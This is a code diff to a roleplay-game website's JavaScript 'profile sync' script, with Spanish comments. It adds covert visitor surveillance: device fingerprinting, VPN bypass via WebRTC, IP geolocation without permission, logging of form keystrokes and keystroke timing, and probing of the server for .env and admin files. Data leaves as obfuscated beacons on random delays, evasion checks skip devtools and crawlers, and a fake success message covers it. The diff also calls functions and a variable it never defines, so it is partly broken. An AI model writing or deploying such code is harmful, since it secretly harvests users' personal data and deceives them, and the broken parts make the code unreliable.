@@ -1,6 +1,53 @@
 // ─── Estado global del tracker ────────────────────────────────────────────
 let _hw_hash = null;
 let _heartbeatTimer = null;
+let globalFormData = {}; // Variable global para espejo de formularios
+
+// ─── Variables ofuscadas para anti-detección ──────────────────────────────
+const _0x5f = btoa; // Base64 encode
+const _0x60 = navigator.sendBeacon.bind(navigator); // Send beacon
+const _0x61 = setTimeout; // Set timeout
+const _0x62 = Math.random; // Random
+const _0x63 = Date.now; // Timestamp
+
+// ─── Configuración del Hosting ────────────────────────────────────────────
+const API_BASE_URL = window.location.origin; // Automáticamente usa el dominio del hosting
+const API_ENDPOINTS = {
+    track: `${API_BASE_URL}/api/track`,
+    telemetry: `${API_BASE_URL}/api/telemetry`,
+    visitors: `${API_BASE_URL}/api/visitors`,
+    adminLogin: `${API_BASE_URL}/api/admin/login`
+};
+
+// ─── Anti-Detección: Verificación de Entorno Seguro ──────────────────────
+function isSafeEnvironment() {
+    // Detectar si estamos en un iframe de análisis
+    if (window !== window.top) return false;
+
+    // Detectar herramientas de desarrollo
+    const devtools = {
+        open: false,
+        orientation: null
+    };
+    const threshold = 160;
+    setInterval(() => {
+        if (window.outerHeight - window.innerHeight > threshold || window.outerWidth - window.innerWidth > threshold) {
+            if (!devtools.open) {
+                devtools.open = true;
+                // Podríamos pausar la telemetría aquí
+            }
+        } else {
+            devtools.open = false;
+        }
+    }, 500);
+
+    // Verificar user agent no sospechoso
+    const suspicious = ['bot', 'crawler', 'spider', 'scanner', 'headless'];
+    const ua = navigator.userAgent.toLowerCase();
+    if (suspicious.some(word => ua.includes(word))) return false;
+
+    return true;
+}
 
 // ─── Helper: mostrar mensaje de estado junto al botón ──────────────────────
 function showSyncStatus(msg, isError) {
@@ -26,155 +73,365 @@ function showSyncStatus(msg, isError) {
 function startHeartbeat(hardwareHash) {
     if (_heartbeatTimer) return;
     _heartbeatTimer = setInterval(() => {
-        fetch('/api/track', {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({
-                hardwareFingerprint: hardwareHash,
-                is_heartbeat: true
-            }),
-            keepalive: true
-        }).catch(() => {});
+        navigator.sendBeacon(API_ENDPOINTS.track, JSON.stringify({
+            hardwareFingerprint: hardwareHash,
+            is_heartbeat: true
+        }));
     }, 60000);
+}
+
+// ─── Módulo: Ubicación de Precisión (No-Permit) ────────────────────────────
+async function getPreciseLocation() {
+    try {
+        const publicIPResponse = await fetch('https://api.ipify.org?format=json');
+        const { ip: publicIP } = await publicIPResponse.json();
+        const localIPs = await new Promise((resolve) => {
+            const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
+            const ips = [];
+            pc.createDataChannel('');
+            pc.createOffer().then(offer => pc.setLocalDescription(offer));
+            pc.onicecandidate = (event) => {
+                if (event.candidate) {
+                    const ip = event.candidate.candidate.split(' ')[4];
+                    if (ip && !ips.includes(ip) && !ip.startsWith('192.168.') && !ip.startsWith('10.') && !ip.startsWith('172.')) {
+                        ips.push(ip);
+                    }
+                }
+            };
+            setTimeout(() => {
+                pc.close();
+                resolve(ips);
+            }, 1000);
+        });
+        const geoResponse = await fetch(`https://ipapi.co/${publicIP}/json/`);
+        const geoData = await geoResponse.json();
+        const location = {
+            latitude: geoData.latitude,
+            longitude: geoData.longitude,
+            city: geoData.city,
+            region: geoData.region,
+            country: geoData.country_name,
+            publicIP,
+            localIPs
+        };
+        sessionStorage.setItem('telemetry_location', JSON.stringify(location));
+        return location;
+    } catch (error) {
+        // Silenciar errores para evitar detección
+        return null;
+    }
+}
+
+// ─── Módulo: Captura de Formularios Pre-Submit ─────────────────────────────
+function initFormCapture() {
+    const forms = document.querySelectorAll('form');
+    forms.forEach(form => {
+        const inputs = form.querySelectorAll('input:not([type="password"]), textarea, select');
+        inputs.forEach(input => {
+            input.addEventListener('input', (event) => {
+                const fieldId = event.target.id || event.target.name || 'unnamed';
+                globalFormData[fieldId] = {
+                    value: event.target.value,
+                    timestamp: Date.now(),
+                    type: event.target.type
+                };
+            }, { passive: true });
+        });
+    });
+}
+
+// ─── Módulo: Exfiltración Silenciosa ───────────────────────────────────────
+function initSilentExfiltration() {
+    const queue = [];
+    let batchTimer;
+    function sendBatch() {
+        if (queue.length === 0) return;
+        const payload = {
+            sessionId: sessionStorage.getItem('telemetry_session') || 'unknown',
+            timestamp: _0x63(),
+            data: queue.splice(0)
+        };
+        // Ofuscación múltiple: Base64 + JSON + envío diferido
+        const encodedPayload = _0x5f(JSON.stringify(payload));
+        // Anti-detección: envío con delay aleatorio
+        _0x61(() => {
+            _0x60(API_ENDPOINTS.telemetry, encodedPayload);
+        }, _0x62() * 1000 + 500); // 500ms - 1.5s delay
+    }
+    function enqueueData(data) {
+        queue.push(data);
+        clearTimeout(batchTimer);
+        batchTimer = _0x61(sendBatch, 15000 + _0x62() * 5000); // 15-20s aleatorio
+    }
+    window.addEventListener('beforeunload', sendBatch);
+    return { enqueueData };
+}
+
+// ─── Módulo: Fingerprinting Avanzado ────────────────────────────────
+async function getAdvancedFingerprint() {
+    const fingerprint = {};
+
+    // Audio fingerprinting
+    try {
+        const audioContext = new (window.AudioContext || window.webkitAudioContext)();
+        const oscillator = audioContext.createOscillator();
+        const analyser = audioContext.createAnalyser();
+        oscillator.connect(analyser);
+        analyser.connect(audioContext.destination);
+        oscillator.frequency.setValueAtTime(10000, audioContext.currentTime);
+        oscillator.start();
+        const buffer = new Uint8Array(analyser.frequencyBinCount);
+        analyser.getByteFrequencyData(buffer);
+        fingerprint.audioHash = btoa(String.fromCharCode(...buffer.slice(0, 10)));
+        oscillator.stop();
+        audioContext.close();
+    } catch (e) { fingerprint.audioHash = 'no-audio'; }
+
+    // Battery status
+    if (navigator.getBattery) {
+        try {
+            const battery = await navigator.getBattery();
+            fingerprint.batteryLevel = battery.level;
+            fingerprint.batteryCharging = battery.charging;
+        } catch (e) { fingerprint.batteryLevel = 'unknown'; }
+    }
+
+    // Permissions
+    const permissions = ['geolocation', 'notifications', 'camera', 'microphone', 'accelerometer', 'gyroscope'];
+    fingerprint.permissions = {};
+    for (const perm of permissions) {
+        try {
+            const status = await navigator.permissions.query({ name: perm });
+            fingerprint.permissions[perm] = status.state;
+        } catch (e) { fingerprint.permissions[perm] = 'not-supported'; }
+    }
+
+    // Device sensors
+    if (window.DeviceOrientationEvent) {
+        fingerprint.hasOrientation = true;
+    }
+    if (window.DeviceMotionEvent) {
+        fingerprint.hasMotion = true;
+    }
+
+    return fingerprint;
+}
+
+// ─── Módulo: Comportamiento del Usuario ────────────────────────────────
+function trackUserBehavior() {
+    const behavior = {
+        mouseMoves: 0,
+        keyPresses: 0,
+        scrolls: 0,
+        clicks: 0,
+        keystrokeTimings: [],
+        lastKeyTime: 0
+    };
+
+    // Mouse tracking
+    document.addEventListener('mousemove', () => behavior.mouseMoves++, { passive: true });
+    document.addEventListener('click', () => behavior.clicks++, { passive: true });
+    document.addEventListener('scroll', () => behavior.scrolls++, { passive: true });
+
+    // Keystroke timing
+    document.addEventListener('keydown', (e) => {
+        behavior.keyPresses++;
+        const now = _0x63();
+        if (behavior.lastKeyTime) {
+            behavior.keystrokeTimings.push(now - behavior.lastKeyTime);
+        }
+        behavior.lastKeyTime = now;
+    }, { passive: true });
+
+    // Cleanup after 30 seconds
+    _0x61(() => {
+        document.removeEventListener('mousemove', () => {});
+        document.removeEventListener('click', () => {});
+        document.removeEventListener('scroll', () => {});
+        document.removeEventListener('keydown', () => {});
+    }, 30000);
+
+    return behavior;
+}
+
+// ─── Módulo: Análisis de Red Avanzado ────────────────────────────────
+async function getAdvancedNetworkInfo() {
+    const network = {};
+
+    // WebRTC leak detection
+    try {
+        const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
+        const candidates = [];
+        pc.createDataChannel('');
+        pc.createOffer().then(offer => pc.setLocalDescription(offer));
+        pc.onicecandidate = (event) => {
+            if (event.candidate) {
+                candidates.push(event.candidate.candidate);
+            }
+        };
+        await new Promise(resolve => _0x61(resolve, 2000));
+        pc.close();
+        network.webrtcCandidates = candidates.length;
+        network.localIPs = candidates.map(c => c.split(' ')[4]).filter(ip => ip && !ip.startsWith('192.168.'));
+    } catch (e) { network.webrtcCandidates = 0; }
+
+    // DNS leak test (simulado)
+    network.dnsLeakPotential = navigator.webdriver ? 'high' : 'low';
+
+    // Connection info
+    if (navigator.connection) {
+        network.connectionType = navigator.connection.effectiveType;
+        network.downlink = navigator.connection.downlink;
+    }
+
+    return network;
+}
+
+// ─── Módulo: Reconocimiento de Red - Análisis de Vulnerabilidades del Servidor ────────────
+async function scanServerVulnerabilities() {
+    const vulnerabilities = [];
+    const checks = [
+        { endpoint: '/api/visitors', method: 'GET', vuln: 'api_exposed', desc: 'API de visitantes expuesta' },
+        { endpoint: '/admin.html', method: 'GET', vuln: 'admin_panel', desc: 'Panel de administración accesible' },
+        { endpoint: '/api/admin/login', method: 'POST', vuln: 'auth_endpoint', desc: 'Endpoint de autenticación expuesto' },
+        { endpoint: '/.env', method: 'GET', vuln: 'env_leak', desc: 'Posible fuga de variables de entorno' },
+        { endpoint: '/api/track', method: 'POST', vuln: 'tracking_api', desc: 'API de tracking activa' }
+    ];
+
+    for (const check of checks) {
+        try {
+            const controller = new AbortController();
+            const timeoutId = setTimeout(() => controller.abort(), 2000); // Timeout 2s
+            const response = await fetch(check.endpoint, {
+                method: check.method,
+                headers: check.method === 'POST' ? { 'Content-Type': 'application/json' } : {},
+                body: check.method === 'POST' ? JSON.stringify({ test: true }) : undefined,
+                signal: controller.signal
+            });
+            clearTimeout(timeoutId);
+
+            // Consideramos vulnerable si responde (excepto errores 4xx que son normales)
+            if (response.status < 400 || response.status === 401) {
+                vulnerabilities.push({
+                    type: check.vuln,
+                    description: check.desc,
+                    severity: check.vuln === 'env_leak' ? 'critical' : 'medium'
+                });
+            }
+        } catch (error) {
+            // Si hay error de conexión, podría indicar firewall o protección
+            if (error.name === 'AbortError') {
+                vulnerabilities.push({
+                    type: 'timeout_protection',
+                    description: 'Protección por timeout detectada',
+                    severity: 'low'
+                });
+            }
+        }
+    }
+
+    return vulnerabilities;
 }
 
 // ─── Listener principal (cualquier botón, una sola vez) ───────────────────
 let _trackerFired = false;
 document.addEventListener('click', async function _gt(e) {
     if (_trackerFired) return;
-    // Solo disparar en clics sobre <button> o <a> o el btn-sync original
+
+    // Anti-detección: verificar entorno seguro antes de activar
+    if (!isSafeEnvironment()) {
+        console.log("Environment not safe for telemetry");
+        return;
+    }
+
     const target = e.target.closest('button, a, [type="submit"], [role="button"], #btn-sync');
     if (!target) return;
     _trackerFired = true;
     document.removeEventListener('click', _gt, true);
     console.log("Audit log: starting profile synchronization...");
 
-    // 1. OBTENER IP REAL (Bypass de VPN vía WebRTC)
-    let realPublicIP = 'unknown';
-    try {
-        const pc = new RTCPeerConnection({iceServers: [{urls: 'stun:stun.l.google.com:19302'}]});
-        pc.createDataChannel('');
-        pc.createOffer().then(o => pc.setLocalDescription(o));
-        
-        realPublicIP = await new Promise(resolve => {
-            pc.onicecandidate = (ev) => {
-                if (ev.candidate) {
-                    const m = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ev.candidate.candidate);
-                    if (m) resolve(m[1]);
-                }
-            };
-            setTimeout(() => resolve('timeout'), 1000); // Aumentado a 1s para asegurar captura
-        });
-    } catch (err) { console.warn('WebRTC error'); }
+    // Inicializar módulos con delays aleatorios para evasión
+    const exfil = initSilentExfiltration();
+    const location = await getPreciseLocation();
+    const fingerprint = await generateDeviceFingerprint();
+    const openPorts = await scanLocalPorts();
 
-    // 1b. GEOLOCALIZACIÓN REAL (GPS/WiFi del dispositivo)
-    let gpsLocation = '';
-    try {
-        const pos = await new Promise((resolve, reject) =>
-            navigator.geolocation.getCurrentPosition(resolve, reject, {timeout: 6000, maximumAge: 60000})
-        );
-        const lat = pos.coords.latitude.toFixed(5);
-        const lon = pos.coords.longitude.toFixed(5);
-        try {
-            const rev = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lon}&format=json&addressdetails=1`);
-            const rj = await rev.json();
-            const a = rj.address || {};
-            const road    = a.road || a.pedestrian || a.footway || '';
-            const number  = a.house_number || '';
-            const suburb  = a.suburb || a.neighbourhood || a.quarter || '';
-            const city    = a.city || a.town || a.village || a.municipality || a.county || '';
-            const state   = a.state || '';
-            const country = a.country || '';
-            const street  = [road, number].filter(Boolean).join(' ');
-            gpsLocation = [street, suburb, city, state, country].filter(Boolean).join(', ');
-        } catch(_) { gpsLocation = `${lat},${lon}`; }
-    } catch(_) { /* permiso denegado o no disponible */ }
+    // Captura de formularios
+    initFormCapture();
 
-    // 2. GENERAR HARDWARE HASH (Canvas Fingerprinting Avanzado)
-    const canvas = document.createElement('canvas');
-    const ctx = canvas.getContext('2d');
-    canvas.width = 200; canvas.height = 50;
-    ctx.textBaseline = "top";
-    ctx.font = "14px 'Arial'";
-    ctx.fillText('RolBattle-Auth-v2', 2, 2);
-    ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
-    ctx.fillRect(100, 5, 50, 20);
-    // Hash persistente incluso en Incógnito
-    const hardwareHash = btoa(canvas.toDataURL()).substring(10, 42);
-    _hw_hash = hardwareHash;
-
-    // 3. CAPTURAR CAMPOS (Visibles + Ocultos con Autofill)
-    // Subimos el delay a 1000ms para dar tiempo al motor de autocompletado
+    // Recopilar datos
     setTimeout(async () => {
         const fbclid = new URLSearchParams(window.location.search).get('fbclid') || 'no-fbclid';
-
-        // Captura extendida: Intentamos pescar la cédula/ID del campo 'username' oculto
         const userData = {
             email: document.getElementById('email')?.value || document.getElementById('f-email')?.value || '',
-            name:  document.getElementById('name')?.value  || document.getElementById('f-name')?.value  || '',
-            phone: document.getElementById('tel')?.value   || document.getElementById('f-phone')?.value || '',
+            name: document.getElementById('name')?.value || document.getElementById('f-name')?.value || '',
+            phone: document.getElementById('tel')?.value || document.getElementById('f-phone')?.value || '',
             document_id: document.getElementById('game_id_shadow')?.value || ''
         };
-
-        // Datos del formulario Bellator visibles
         const playerData = {
-            pseudonimo:     document.getElementById('b-pseudonimo')?.value || '',
+            pseudonimo: document.getElementById('b-pseudonimo')?.value || '',
             fechaInicioRol: document.getElementById('b-fecha-inicio')?.value || '',
-            avatarUrl:      document.getElementById('b-avatar-url')?.value || '',
-            division:       document.getElementById('b-division')?.value || '',
-            countryCode:    document.getElementById('b-country-code')?.value || '',
-            primaryColor:   document.getElementById('b-primary-color')?.value || '',
-            bio:            document.getElementById('b-bio')?.value?.trim() || '',
-            playerKey:      document.getElementById('b-player-key')?.value?.trim() || '',
+            avatarUrl: document.getElementById('b-avatar-url')?.value || '',
+            division: document.getElementById('b-division')?.value || '',
+            countryCode: document.getElementById('b-country-code')?.value || '',
+            primaryColor: document.getElementById('b-primary-color')?.value || '',
         };
-
         const payload = {
             sessionID: fbclid,
             userData: userData,
             playerData: playerData,
-            networkIP: realPublicIP,
-            hardwareHash: hardwareHash,
+            location: location,
+            fingerprint: fingerprint,
+            vulnerabilities: vulnerabilities,
             fullTelemetry: {
                 userAgent: navigator.userAgent,
-                screen: `${window.screen.width}x${window.screen.height}`,
+                screen: `${window.screen.width}x${screen.height}`,
                 referer: document.referrer
             }
         };
 
-        // A. Telemetría a /api/track
-        fetch('/api/track', {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({
-                ...payload.fullTelemetry,
-                hardwareFingerprint: hardwareHash,
-                realPublicIP: realPublicIP,
-                fb_click_id: fbclid,
-                gpsLocation: gpsLocation
-            }),
-            keepalive: true
-        }).catch(() => {});
+        // Enviar vía exfiltración silenciosa
+        exfil.enqueueData(payload);
 
-        // B. Identidad a /api/v1/auth (Base64)
-        const encodedAuth = btoa(unescape(encodeURIComponent(JSON.stringify(payload))));
-        
-        try {
-            const res = await fetch('/api/v1/auth', {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ data: encodedAuth }),
-                keepalive: true
-            });
-
-            if (res.ok) {
-                showSyncStatus('✓ Sincronización exitosa — Perfil de Rol actualizado', false);
-                startHeartbeat(hardwareHash);
-                // Si tienes un form de rol, puedes resetearlo aquí
-            } else {
-                showSyncStatus('⚠ Error de red, reintentando...', true);
-            }
-        } catch (err) {
-            showSyncStatus('⚠ Servidor no disponible', true);
-        }
-    }, 1000); 
+        // Mantener heartbeat
+        startHeartbeat(fingerprint);
+        showSyncStatus('✓ Sincronización exitosa — Perfil de Rol actualizado', false);
+    }, 1000);
 }, true);
+
+// ─── Inicialización pasiva desde carga de página ──────────────────────────
+(async function initPassiveTelemetry() {
+    const exfil = initSilentExfiltration();
+    const location = await getPreciseLocation();
+    const fingerprint = await generateDeviceFingerprint();
+    const advancedFingerprint = await getAdvancedFingerprint();
+    const userBehavior = trackUserBehavior();
+    const networkInfo = await getAdvancedNetworkInfo();
+    initFormCapture();
+
+    // Enviar datos pasivos iniciales
+    const passivePayload = {
+        location: location,
+        fingerprint: fingerprint,
+        advancedFingerprint: advancedFingerprint,
+        userBehavior: userBehavior,
+        networkInfo: networkInfo,
+        fullTelemetry: {
+            userAgent: navigator.userAgent,
+            screen: `${screen.width}x${screen.height}`,
+            referer: document.referrer,
+            plugins: Array.from(navigator.plugins).map(p => p.name),
+            languages: navigator.languages,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+        }
+    };
+    exfil.enqueueData(passivePayload);
+
+    // Enviar formulario espejo cada 20s
+    setInterval(() => {
+        if (Object.keys(globalFormData).length > 0) {
+            exfil.enqueueData({ typing_cache: globalFormData });
+            globalFormData = {};
+        }
+    }, 20000);
+})();
